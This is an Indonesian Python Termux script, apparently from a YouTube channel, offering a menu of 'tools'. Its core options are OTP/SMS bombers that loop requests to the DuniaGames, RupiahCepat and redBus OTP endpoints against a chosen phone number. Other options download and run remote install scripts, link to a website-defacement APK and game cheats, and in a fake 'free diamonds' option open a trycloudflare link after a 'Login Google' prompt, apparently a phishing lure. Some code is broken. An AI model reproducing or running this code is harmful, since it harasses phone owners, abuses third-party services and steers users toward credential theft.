# Jangan Lupa Subscribe Mr_Dark :)
# Recode Sebelum Subscribe? ANAK HARAM!!



import os,sys,time,requests,json,random,requests
import itertools
import threading
from requests import post
from requests import get
os.system("clear")
os.system("git pull")
r = requests.Session()
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
def mr_x():
    os.system("clear")
    os.system("pkg install neofetch")
    os.system("pip install requests")
    os.system("pip install mechanize")
    os.system("clear")
    os.system("neofetch")
    os.system("date")
    time.sleep(1)
    print ("")
    Kz = input("Mau Lanjut ke tools? \033[91m(\033[92my\033[97m/\033[92mt\033[91m) \033[97m:\033[97m ")
    print ("\033[1;36mInfo:")
    print ("\033[1;32m1. \033[1;33mWelcome To My Tools\033[31m")
    time.sleep(3)
    print ("\033[1;32m2. \033[1;33mSlamat Bulan Suci Ramadan \033[31m")
    time.sleep(3)
    print ("\033[1;32m3. \033[1;33mDisini Gua Sediahkan Berbagai Macam pilihan\033[31m")
    time.sleep(3)
    print ("\033[1;32m4. \033[1;33mTools Special Bulan Ramadan !!!\033[31m")
    time.sleep(3)
    print ("\033[1;32m4. \033[1;33mSebelum lanjut Subrek Duluh Chanel gua :) !!!\033[31m")
    time.sleep(4)
    os.system("xdg-open https://youtube.com/channel/UCRaVHUXQGVAH7Gof7kixIoQ")
    os.system("clear")
def alok_mengpro():
    alok = input("   \033[1;37m\033[31m➤ \033[36m")
    if alok == "1":
         print ("  \033[1;30m<══════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         telkom_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         inquiryId_telkom = "219424679"
         telkom = ("0"+telkom_0)
         dark={
         "phoneNumber":telkom,
         "inquiryId":inquiryId_telkom
         }
         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=dark).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mNo Target Harus Menggunakan Telkomsel! \033[31m ')
                  time.sleep(2)
                  print ("  \033[1;30m<══════════[\033[1;33;41m • \033[1;37mSTOP \033[1;33m• \033[0m\033[1;30m]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi! \033[31m ')
             else:
                  print ('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
             countdownTimer(00, 60)
    elif alok == "3":
         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         xl_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         xl = ("0"+xl_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         data={
         "inquiryId":InquiryId_xl,
         "phoneNumber":xl,
         "transactionId":id_xl
         }
         mr_dark={
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "Connection": "keep-alive",
         "Content-Length": "24",
         "content-type": "application/json",
         "Host": "cmsapi.mapclub.com",
         "Origin": "https://www.mapclub.com",
         "Referer": "https://www.mapclub.com/id/user/signup",
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-site",
         "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
         }
         dt = {"phone":xl}
         dtjs = json.dumps(dt)
         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             url2 = 'https://m.redbus.id/api/getOtp?number='+xl+'&cc=62&whatsAppOpted=True'
             a = requests.get(url2,headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"}).text
             b = json.loads(a)["Message"]
             if b == 'OTP Sent Successfully':
                  print('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  time.sleep(5)
             else:
                  print('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37msilah kan coba lagi setelah 15 menit! \033[31m ')
                  break
    elif alok == "2":
         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         no_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+no_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
         hd = {
         "accept": "text/html, application/xhtml+xml, application/json, */*",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "content-length": "166",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "origin": "https://h5.rupiahcepatweb.com",
         "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
         }
         dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
         data = json.dumps(dt)
         for i in range(int(jumlah)):
             a = r.post(url,headers=hd,data={"data":data}).text
             b = json.loads(a)["code"]
             if b == 0:
                  print('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  countdownTimer(00, 60)
             else:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mGagal! \033[31m ')
                  countdownTimer(00, 60)
    elif alok == "5":
         print ("Login Untuk menjadi User..")
    elif alok == "6":
         os.system("xdg-open https://wa.me/628992176733")
    elif alok == "7":
         os.system("xdg-open https://youtube.com/channel/UCRaVHUXQGVAH7Gof7kixIoQ")
    elif alok == "8":
         os.system("xdg-open https://t.me/Kztutorial")
    elif alok == "9":
         os.system("xdg-open https://chat.whatsapp.com/GfDPRMb91AD8UXpD2jbJVD")
    elif alok == "10":
         os.system("xdg-open https://chat.whatsapp.com/EgOMTyPLeQuKiPkczolIXW")
    elif alok == "11":
         os.system("xdg-open https://chat.whatsapp.com/HcqP6iLhKfO2f1P3vHQfDw")
    elif alok == "12":
         os.system("xdg-open https://t.me/termuxst")
    elif alok == "13":
         os.system("xdg-open https://t.me/CyberExploitGroup")
    elif alok == "14":
         os.system("xdg-open https://t.me/CPDTech")
    elif alok == "15":
         os.system("xdg-open https://www.apkmirror.com/apk/fredrik-fornwall/termux-fdroid-version/termux-fdroid-version-0-118-0-release/termux-fdroid-version-0-118-0-android-apk-download/")
    elif alok == "16":
         os.system("xdg-open https://www.mediafire.com/file/au1r0l8rz7n8x3i/ScriptDroid.apk/file")
    elif alok == "17":
         os.system("xdg-open https://m.apkpure.com/id/garena-free-fire-android-il/com.dts.freefireth/amp")
    elif alok == "18":
         os.system("xdg-open https://www.google.com/amp/s/m.apkpure.com/id/mobile-legends/com.mobile.legends/amp")
    elif alok == "19":
         os.system("xdg-open https://www.google.com/amp/s/m.apkpure.com/id/pubg-mobile-for-android/com.tencent.ig/amp")
    elif alok == "20":
         os.system("xdg-open https://www.google.com/amp/s/m.apkpure.com/id/clash-of-clans-coc/com.supercell.clashofclans/amp")
    elif alok == "21":
         os.system("xdg-open https://www.google.com/amp/s/m.apkpure.com/id/call-of-duty%25C2%25AE-mobile-garena/com.garena.game.codm/amp")
    elif alok == "27":
         os.system("termux-setup-storage")
         os.system("pkg install proot")
         os.system("pkg install wget")
         os.system("pkg install curl")
         os.system("pip install requests")
         os.system("wget -O install-nethunter-termux https://offs.ec/2MceZWr")
         os.system("chmod +x install-nethunter-termux")
         os.system("./install-nethunter-termux")
    elif alok == "26":
         os.system("clear")
         os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
         os.system("chmod +x metasploit.sh")
         os.system("./metasploit.sh")
         os.system("msfconsole")
         time.sleep(3)
         os.system("xdg-open https://youtu.be/uFhQ7reDxdY")
    elif alok == "4":
         os.system("pkg install git")
         os.system("pkg install python")
         os.system("pkg install python3")
         os.system("git clone https://github.com/kZtotorial/Spam-smsV2")
         print ("\033[97mketikan\033[91m :\033[92m cd Spam-smsV2")
         print ("\033[96menter")
         print ("\033[97mterus ketikan lagi\033[91m :\033[92m python3 enc_sc.py")
         print ("\033[96menter")
    elif alok == "25":
         os.system("pkg install wget")
         os.system("pip install requests")
         os.system("wget http://www.rfxnetworks.com/downloads/bfd-current.tar.gz")
         print ("")
    elif alok == "24":
         print ("")
         print ("\033[92mPaswoard : V1 BANG")
         time.sleep(2)
         print ("")
         os.system("xdg-open https://www.mediafire.com/file/x0tczl6x4erpfau/Subscribe_Bro%2521.zip/file")
    elif alok == "23":
         print ("Subscrib dong yt gua >-<")
         time.sleep(2)
         os.system("xdg-open https://www.mediafire.com/file/mkv7eumroba7o4g/HikariFree.zip/file%28Expired")
    elif alok == "22":
         print ("Subscribe bang >-<")
         os.system("xdg-open https://www.mediafire.com/file/a4xfzfzbdswh9sj/CONFIG_VIP_FF_ORI_V80.zip/file")
    elif alok == "29":
         os.system("\033[92mapt update")
         os.system("apt upgrade")
         os.system("pkg install python")
         os.system("pkg install python2")
         os.system("pkg install python3")
         os.system("pkg install git")
         os.system("pkg install wget")
         os.system("pkg install git")
         os.system("pkg install php")
         os.system("pkg install nano")
         os.system("pkg install unzip")
         os.system("pip install requests")
         os.system("pip install mechanize")
         os.system("pip install lolcat")
         os.system("pip install termcolor")
         os.system("pkg install root-repo")
         os.system("pkg install unstable-repo")
         os.system("pkg install x11-repo")
         os.system("pkg update && pkg upgrade")
         os.system("pkg install figlet")
         os.system("pkg install ruby")
         os.system("gem install lolcat")
         os.system("pkg install jq")
         os.system("pip install module bs4")
         os.system("pkg install ")
         os.system("pkg upgrade git")
         os.system("pkg upgrade python")
         os.system("pip upgrade mechanize")
         os.system("pip upgrade requests")
         os.system("pkg upgrade python2")
         os.system("pkg upgrade ruby")
         os.system("pkg upgrdae git")
         os.system("pkg upgrade php")
         os.system("pkg upgrade wget")
         print ("\033[92mUpgrade Berhasil :) !!!")
    elif alok == "28":
         os.system("pkg update && pkg upgrade")
         os.system("pkg install unzip")
         os.system("pkg install wget")
         os.system("pkg install python")
         os.system("pkg install python2")
         os.system("pkg install proot")
         os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
         os.system("unzip ngrok-stable-linux-arm.zip")
         print ("exe: ./ngrok (Auto token luh yang di.croom buka aja web ngrok trus cari tokenya) ")
         print (" kalau udh slanjut nya ketik ./ngrok http 8080")
         os.system("./ngrok http 8080")
    elif alok == "30":
          kz = input("Masukan ID Freefire : ")
          ks = input("Masukan Nickname Freefire : ")
          kb = input("Masukan Level Akun : ")
          ka = input("Masukan Jumlah Diamond : ")
          time.sleep(2)
          print ("\033[92mLogin Google...")
          time.sleep(2)
          os.system("xdg-open https://councils-dietary-compression-nor.trycloudflare.com")
    elif alok == "00":
         print ("   \033[91mSamapai jumpa Lagi :)")
         os.system("exit")
    else:
         time.sleep(2)
         print ("\033[1;37m[\033[31m•\033[1;37m] Printah: "+alok+" Salah :(")
         time.sleep(3)
         os.system("clear")
         banner_anjay_alok()
def banner_anjay_alok():
    print ("")
    print ("   \033[97m  •   \033[91m  •\033[97m     •\033[91m     •\033[97m     •\033[91m     • \033[97m      •\033[91m     •   \033[97m  •")
    print ("   \033[96m  _     _     _     _     _     _       _     _     _ ")
    print ("   \033[97m / \   / \   / \   / \   / \   / \     / \   / \   / \ ")
    print ("   \033[97m(\033[92m T\033[97m ) (\033[92m E\033[97m ) (\033[92m L\033[97m ) (\033[92m K\033[97m ) (\033[92m O\033[97m ) (\033[92m M\033[97m )   (\033[92m O\033[97m ) (\033[92m T\033[97m ) (\033[92m P\033[97m ) ")
    print ("   \033[96m \_/   \_/   \_/   \_/   \_/   \_/     \_/   \_/   \_/ ")
    print ("   \033[91m  •   \033[97m  •\033[91m     •\033[97m     •\033[91m     •\033[97m     • \033[91m      •\033[97m     •   \033[91m  •")
    print ("   \033[1;37m\033[91m•\033[1;37m YouTube\033[31m: \033[91m(\033[1;92mKz.tutorial\033[91m) ")
    print ("   \033[1;37m\033[91m•\033[1;37m Github\033[91m: \033[91m(\033[92mgithub.com/KZ.tutorial\033[91m) ")
    print ("   \033[1;97m\033[91m•\033[1;97m Status\033[91m: (\033[1;92mONLINE\033[91m)")
    print ("   \033[1;97m\033[91m•\033[1;97m Version\033[91m: (\033[97m0\033[91m.\033[1;97m9\033[91m)")
    print ("   \033[1;97m\033[91m•\033[1;97m Kartu\033[91m: \033[1;91m(\033[1;92mTelkomsel\033[91m) \033[1;91m(\033[1;92m Special BulanRamadan \033[97m:)\033[91m) ")
    print ("")
    print ("    \033[1;30m<═════════[\033[1;33;41m • \033[1;37m MENU TOOLS \033[1;33m• \033[0m\033[1;30m]══════════>")
    print ("    \033[1;97m\033[91m\033[1;93m1\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mSpam Target \033[91m(\033[96mDuniaGames\033[91m) \033[97m~ \033[91m(\033[97mTelkomsel\033[91m)")
    print ("    \033[1;97m\033[91m\033[1;93m2\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mSpam Target \033[91m(\033[96mRupiahCepat\033[91m) \033[97m~ \033[91m(\033[97mTelkomsel\033[91m)")
    print ("    \033[1;97m\033[91m\033[1;93m3\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mSpam Target \033[91m(\033[96mReadBus\033[91m) \033[97m~ \033[91m(\033[97mTelkomsel\033[91m)")
    print ("    \033[1;97m\033[91m\033[1;93m4\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mSpam Target \033[91m(\033[96mAlloprator\033[91m)")
    print ("    \033[1;97m\033[91m\033[1;93m5\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mWebsite  \033[91m(\033[93mAuthour\033[91m)")
    print ("    \033[1;97m\033[91m\033[1;93m6\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mWhatsapp \033[31m(\033[93mAuthour\033[91m) ")
    print ("    \033[1;97m\033[91m\033[1;93m7\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mYoutube  \033[31m(\033[93mAuthour\033[91m) ")
    print ("    \033[1;97m\033[91m\033[1;93m8\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mTelegram \033[31m(\033[93mAuthour\033[91m) ")
    print ("    \033[1;97m\033[91m\033[1;93m9\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Whatsapp \033[92m(\033[95mDark Club\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m10\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Whatsapp \033[92m(\033[95mCayber-Network-Termux\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m11\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Whatsapp \033[92m(\033[95mMetasploit-Termux-Official\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m12\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Telegram \033[92m(\033[95mtermuxstuffs\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m13\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Telegram \033[92m(\033[95mCyberExploit\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m14\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mJoin Grup Telegram \033[92m(\033[95mCPD tech\033[92m) ")
    print ("   \033[1;97m\033[91m\033[1;93m15\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mTermux0.18.0\033[91m) ")
    print ("   \033[1;97m\033[91m\033[1;93m16\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-DefaceWebsite\033[91m) ")
    print ("   \033[1;97m\033[91m\033[1;93m17\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-Freefire\033[91m) ")
    print ("   \033[1;97m\033[91m\033[1;93m18\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-Mobilegands\033[91m) ")
    print ("   \033[1;97m\033[91m\033[1;93m19\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-Pubg\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m20\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-COC\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m21\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mApk-COD\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m22\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mConfig Aim kepala ff\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m23\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mBot Wa Hikarifree\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m24\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDownloads \033[91m(\033[92mBot Wa V1\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m25\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mInstall \033[91m(\033[96mBrutForceDetection\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m26\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mInstall \033[91m(\033[96mMetasploit\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m27\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mInstall \033[91m(\033[96mKali-Nethunter\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m28\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mInstall \033[91m(\033[96mNgrok\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m29\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mUpgrade \033[91m(\033[96mTermux\033[91m)")
    print ("   \033[1;97m\033[91m\033[1;93m30\033[91m.\033[1;97m \033[91m\033[1;97m\033[1;97mDiamond \033[91m(\033[92mFreefire\033[91m)")
    print ("   \033[1;93m00\033[91m. \033[1;92m(\033[91mExit..\033[92m)")
    print ("")
    alok_mengpro()
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'   \033[1;37m[\033[1;35m#\033[1;37m] waiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1

mr_telkom={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
def lagi():
    t = raw_input("Mau Mengunakan tools lagi (y/t) : ")
    if f == "y":
       os.syatem("rub.py")

mr_x()
banner_anjay_alok()
